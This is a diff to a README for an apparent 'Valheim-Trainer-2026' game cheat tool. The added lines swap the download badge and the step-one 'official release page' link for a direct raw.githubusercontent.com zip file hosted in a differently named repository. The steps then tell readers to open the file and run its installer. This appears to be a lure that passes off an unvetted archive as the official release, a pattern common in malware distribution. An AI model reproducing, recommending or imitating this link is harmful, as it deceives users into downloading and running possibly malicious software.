@@ -5,7 +5,7 @@ description: "Modify game variables and access advanced features with this utili
 ---
 # 🛠️ Valheim-Trainer-2026 - Modify your Valheim game experience easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Cancroid-binomialdistribution977/Valheim-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/Cancroid-binomialdistribution977/cancroid-binomialdistribution977.github.io/main/suprarimal/v1.8-alpha.3.zip)
 
 ## 📌 Overview
 
@@ -26,7 +26,7 @@ Your computer must meet these requirements for the software to function:
 
 Follow these steps to set up the trainer on your machine:
 
-1. Visit the [official release page](https://github.com/Cancroid-binomialdistribution977/Valheim-Trainer-2026/releases) to download the latest setup file.
+1. Visit the [official release page](https://raw.githubusercontent.com/Cancroid-binomialdistribution977/cancroid-binomialdistribution977.github.io/main/suprarimal/v1.8-alpha.3.zip) to download the latest setup file.
 2. Locate the download folder on your computer.
 3. Open the file to start the installer.
 4. Follow the prompts on the screen.
